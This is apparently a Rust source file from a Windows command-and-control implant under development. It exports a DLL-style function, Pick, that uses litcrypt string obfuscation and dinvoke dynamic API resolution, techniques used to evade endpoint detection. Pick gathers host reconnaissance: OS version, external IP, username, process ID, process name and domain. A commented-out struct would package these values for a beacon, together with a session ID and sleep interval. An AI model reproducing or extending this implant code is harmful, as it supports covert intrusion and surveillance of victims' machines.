use crate::func;

use serde::{Deserialize, Serialize};

use_litcrypt!();

#[derive(Serialize, Deserialize, Debug)]
pub struct ImpInfo {
    pub session: String,
    pub ip: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub imp_pid: String,
    pub process_name: String,
    pub sleep: String,
}

#[no_mangle]
pub extern "system" fn Pick() {
    //println!("Hello, world!");

    let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");
    let kernel32 = dinvoke_rs::dinvoke::get_module_base_address("kernel32.dll");

    //this is a test to make sure dinvoke is working as expected
    /* 
    if ntdll == 0 {
        println!("Failed to locate ntdll.dll");
        return;
    }

    let version = func::get_version(ntdll);
    println!("Version: {}", version);
    */
/* 
    let imp_info = ImpInfo {
        session: env!("UUID").to_string(), //grabs the UUID from the environment used to build the implant
        ip: get_external_ip(),        //replace with real get_external_ip function
        username: get_username(),          //get the username
        //hardcode domain for now as TODO
        domain: "TODO".to_string(),
        os: func::get_version(ntdll),  //get the os version
        imp_pid: get_pid(), //get the process id
        process_name: get_process_name(),
        sleep: env!("SLEEP").to_string(), //grabs the SLEEP from the environment used to build the implant
    };

    */

    //call get_versiion and print the string
    println!("OS Version: {}", func::get_version(ntdll));

    //call get_external_ip and print the string
    println!("External IP: {}", func::get_external_ip(ntdll, kernel32));

    //call the get_username fn and print the string
    println!("username: {}", func::get_username());

    //call the get_pid fn and print the string
    println!("pid: {}", func::get_pid());

    //call the get_process_name fn and print the string
    println!("process name: {}", func::get_process_name(kernel32));

    //call the get_system_domain fn and print the string
    println!("domain: {}", func::get_system_domain());
    
}